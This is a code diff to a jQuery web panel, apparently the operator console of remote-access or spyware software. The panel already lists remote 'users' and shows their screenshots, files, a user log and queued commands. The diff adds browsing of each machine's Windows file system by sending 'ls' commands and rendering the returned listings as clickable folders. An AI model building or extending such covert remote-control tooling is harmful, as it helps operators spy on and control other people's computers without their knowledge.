@@ -4,12 +4,13 @@ var dir_screenshots = '../screenshots/';
 var dir_files = '../files/';
 var dir_files_2 = 'files/';
 
+var l_dir_default = 'C:\\';
+
 var l_users = [];
 var l_times = [];
 var l_selected = -1;
-
 var l_screenshots = [];
-
+var l_dir = l_dir_default;
 var b_screenshots_shown = false;
 
 var $selected_user = null;
@@ -18,6 +19,7 @@ var $files = null;
 var $screenshots = null;
 var $show_screenshots = null;
 var $cmd = null;
+var $ls = null;
 var $cmds = null;
 var $data = null;
 var $userlog = null;
@@ -116,6 +118,44 @@ function set_userlog(data) {
 	}
 	$userlog.val(data);
 }
+function set_ls(data) {
+
+	$ls.empty();
+
+	var files = data.split('\n');
+	for (var i = 0; i < files.length; i++) {
+		var file = files[i].split('|');
+
+		if (file[0].indexOf(l_dir) != 0)
+			continue;
+
+		if (file[0].lastIndexOf('\\') > l_dir.length)
+			continue;
+			
+		if (file[0] === l_dir+'.')
+			continue;
+			
+		var up = file[0].indexOf('\\..');
+			
+		if (up >= 0)
+		{
+			file[0] = file[0].substring(0, up);
+			file[0] = file[0].substring(0, file[0].lastIndexOf('\\'));
+		}
+
+		var $c = $('<div class="ls_f"></div>').text(file[0]);
+		if (file[1] & 16) {
+			$c.addClass('ls_dir');
+			$c.on('click', {
+				file: file
+			}, function(event) {
+				l_dir = event.data.file[0] + '\\';
+				get_ls(l_selected);
+			});
+		}
+		$ls.append($c);
+	}
+}
 function refresh_users() {
 
 	select_user(-1);
@@ -151,6 +191,9 @@ function refresh_users() {
 }
 
 function select_user(index) {
+
+	var update = (l_selected != index);
+
 	l_selected = index;
 	
 	$users.find('tr').removeClass('highlight');
@@ -160,12 +203,17 @@ function select_user(index) {
 		$data.val('');
 		$cmds.val('');
 		$userlog.val('');
+		$ls.empty();
 	} else {
 		$users.find('tr').eq(index).addClass('highlight');
 		$run_selected.text('Run for ' + l_users[index]).removeAttr('disabled');
 		get_data(index);
 		view_cmds(index);
 		view_userlog(index);
+		if (update) {
+			l_dir = l_dir_default;
+		}
+		get_ls(index);
 	}
 }
 function get_data(index) {
@@ -220,6 +268,19 @@ function clear_userlog(index) {
 		if (l_selected == index) {
 			$userlog.val('');
 		}
+	});
+}
+function get_ls(index) {
+	generic_request(index, 'get_ls', function(data) {
+		set_ls(data);
+		log('Fetched ls for ' + l_users[index]);
+		$.ajax({
+			type: 'POST',
+			url: ctrl,
+			cache: false,
+			dataType: 'text',
+			data: {req : 'put_cmd', cmd: 'ls '+l_dir, user: l_users[index]}
+		});
 	});
 }
 function del_data(index) {
@@ -392,6 +453,7 @@ $(document).ready(function() {
 	$show_screenshots = $('#show_screenshots');
 	$files = $('#files');
 	$cmd = $('#cmd');
+	$ls = $('#ls');
 	$data = $('#data');
 	$cmds = $('#cmds');
 	$userlog = $('#userlog');
